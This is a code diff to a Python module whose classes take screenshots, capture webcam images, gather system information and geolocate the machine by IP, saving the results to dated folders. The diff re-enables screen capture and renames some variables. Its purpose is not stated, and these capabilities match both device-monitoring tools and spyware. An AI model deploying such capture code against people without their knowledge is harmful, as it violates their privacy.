@@ -1,5 +1,5 @@
 import abc
-#import pyautogui
+import pyautogui
 import cv2
 import platform
 import socket
@@ -20,8 +20,8 @@ class Screenshot(Module):
 
     def run(self, save_path_name):
         pass
-        # screenshot = pyautogui.screenshot()
-        # screenshot.save(cpath.generate_day_folder() + '/screenshot-' + save_path_name + '.jpg')
+        screenshot = pyautogui.screenshot()
+        screenshot.save(cpath.generate_day_folder() + '/screenshot-' + save_path_name + '.jpg')
 
 
 class WebcamSnap(Module):
@@ -37,15 +37,16 @@ class WebcamSnap(Module):
             webcam.release()
 
     def search_camera_id(self):
-        id = 0
-        webcam = cv2.VideoCapture(id)
+        cam_id = 0
+        webcam = cv2.VideoCapture(cam_id)
         for i in range(0, 10):
             if not webcam.isOpened():
-                id +=1
-                webcam = cv2.VideoCapture(id)
+                cam_id += 1
+                webcam = cv2.VideoCapture(cam_id)
             else:
-                return id
+                return cam_id
         return -1
+
 
 class SystemInfo(Module):
 
@@ -70,9 +71,9 @@ class GeoLocator(Module):
 
     def run(self, save_path_name):
         ip = geocoder.ip('me')
-        cordinates = ip.latlng
+        coordinates = ip.latlng
         locator = Nominatim(user_agent='geocoder')
-        location = locator.reverse(cordinates)
+        location = locator.reverse(coordinates)
         path = cpath.generate_day_folder() + '/geolocation-' + save_path_name + '.json'
         data = location.raw
         with open(path, 'w') as file:
